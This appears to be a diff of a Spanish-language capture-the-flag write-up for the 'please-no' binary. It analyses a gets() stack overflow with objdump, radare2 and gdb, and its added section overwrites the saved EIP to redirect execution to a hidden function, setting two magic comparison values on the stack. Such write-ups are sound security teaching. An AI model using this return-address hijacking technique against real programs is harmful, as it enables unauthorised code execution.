@@ -56,12 +56,11 @@ NX	: ENABLED
 PIE	: disabled
 RELRO	: Partial
 
-Como no podemos usar la pila para ejecutar un shellcode (NX enabled), echemos un vistazo al código ensamblador para ver si encontramos algo interesante:
+Como no podemos usar la pila para ejecutar un shellcode (NX enabled), echemos un vistazo al código:
 
 objdump -D intel -S please-no
 
-Si nos fijamos no tenemos una clásica función main, parece que nuestras funciones están escondidas en la sección .text
-
+Noo tenemos una clásica función main, parece que nuestras funciones están escondidas en la sección .text
 Si lo analizamos con radare2 sí nos detecta la función main:
 
 main ();
@@ -94,8 +93,6 @@ También hay otras funciones interesantes:
 8048446:	68 30 00 00 00		push	0x30
 804844b:	e9 80 ff ff ff		jmp	80483d0 <printf@plt-0x10>
 
-Hagamos un poco de reversing con dbg para ver hacia donde apuntamos el EIP.
-
 Vemos que hay una línea en .text que llama a gets, este puede ser un buen sitio para poner un breakpoint.
 
 804871a:	e8 d1 fc ff ff		call	80483f0 <gets@plt>
@@ -115,14 +112,12 @@ Ejecutamos el programa y vemos el estado de la pila después de meter 20 "A":
 Starting program: /root/Documents/3DSCTF/please-no 
 AAAAAAAAAAAAAAAAAAAA
 Breakpoint 1, 0x0804871f in ?? ()
-
 >>> x/32xw $esp
 0xbffff350	0xbffff358	0x0804824c	0x41414141	0x41414141
 0xbffff360	0x41414141	0x41414141	0x41414141	0xb7e13200 <--
 0xbffff370	0x00000001	0xbffff404	0xbffff40c	0x00000000
 
 La flecha, que corresponde con la posición de la pila 0xbffff36c, indica el valor que tendremos que sobrescribir para controlar el EIP.
-
 Recordar que aún nos quedan por ejecutar estas dos instrucciones de gets antes de ejecutar el return:
 
 804871f:	31 c0			xor	eax,eax
@@ -130,5 +125,48 @@ Recordar que aún nos quedan por ejecutar estas dos instrucciones de gets antes 
 8048724:	c3			ret
 
 Ya sabemos como controlar el EIP, pero ¿hacia donde lo apuntamos?
+En el código de la sección .text aparece algo interesante:
+
+8048690:	83 ec 1c             	sub    esp,0x1c
+8048693:	81 7c 24 20 41 0c 0b 	cmp    DWORD PTR [esp+0x20],0x1b0b0c41   <--- Comparación sospechosa
+804869a:	1b 
+804869b:	75 2d                	jne    80486ca <fgetc@plt+0x26a>         <--- Me echa si no coincide con 0x1b0b0c41
+804869d:	81 7c 24 24 4e 37 13 	cmp    DWORD PTR [esp+0x24],0xae13374e   <--- Otra comparación sospechosa ¿dónde quiere ir?
+80486a4:	ae 
+80486a5:	75 23                	jne    80486ca <fgetc@plt+0x26a>         <--- Me echa al mismo sitio si no coincide con 0xae13374e
+80486a7:	c7 44 24 16 6d 66 6c 	mov    DWORD PTR [esp+0x16],0x616c666d	 <--- ¿Mete en la pila el nombre del fichero? 0x616c666d='alfm'
+80486ae:	61 
+80486af:	66 c7 44 24 1a 67 00 	mov    WORD PTR [esp+0x1a],0x67			     <--- ¿Y luego una 'g'? ¿'mflag' nombre del fichero? ¿extensión?
+80486b6:	8d 44 24 16          	lea    eax,[esp+0x16]                    <--- Carga la posición de memoria donde está 'mflag'
+80486ba:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax           <--- Nombre del fichero como arg2 de strcat
+80486be:	c7 04 24 39 a0 04 08 	mov    DWORD PTR [esp],0x804a039         <--- Puntero como arg1 donde guardar resultado
+80486c5:	e8 46 fd ff ff       	call   8048410 <strcat@plt>
+80486ca:	83 c4 1c             	add    esp,0x1c
+80486cd:	c3                   	ret    
+
+Vamos a apuntar el EIP a 0x8048690 y además añadimos los dos valores para superar la doble comparación (0x1b0b0c41 y 0xae13374e). 
+Podemos tener la tentación de saltar directamente a 0x80486a7 pero entonces no se ejecutaría el 'sub esp,0x1c' que es básico para
+preparar la llamada a strcat. 
+set {int}0xbffff36c = 0x08048690
+
+Una vez ejecutada la instrucción 0x8048690 la pila quedaría así:
+>>> x/32xw $esp
+0xbffff354:	0x0804824c	0x41414141	0x41414141	0x41414141
+0xbffff364:	0x41414141	0x41414141	0x08048690	0x00000001
+0xbffff374:	0xbffff404	0xbffff40c	0x00000000	0x00000000
+
+Para asegurarnos de que cumpla las dos comparaciones habrá que poner esos valores en su lugar correspondiente en la pila:
+([esp+0x20]=0xbffff374 y [esp+0x24]=0xbffff378)
+set {int}0xbffff374 = 0x1b0b0c41
+set {int}0xbffff378 = 0xae13374e
+
+Estado de la pila:
+>>> x/32xw $esp
+0xbffff354:	0x0804824c	0x41414141	0x41414141	0x41414141
+0xbffff364:	0x41414141	0x41414141	0x08048690	0x00000001
+0xbffff374:	0x1b0b0c41	0xae13374e	0x00000000	0x00000000
+
+
+
 
 
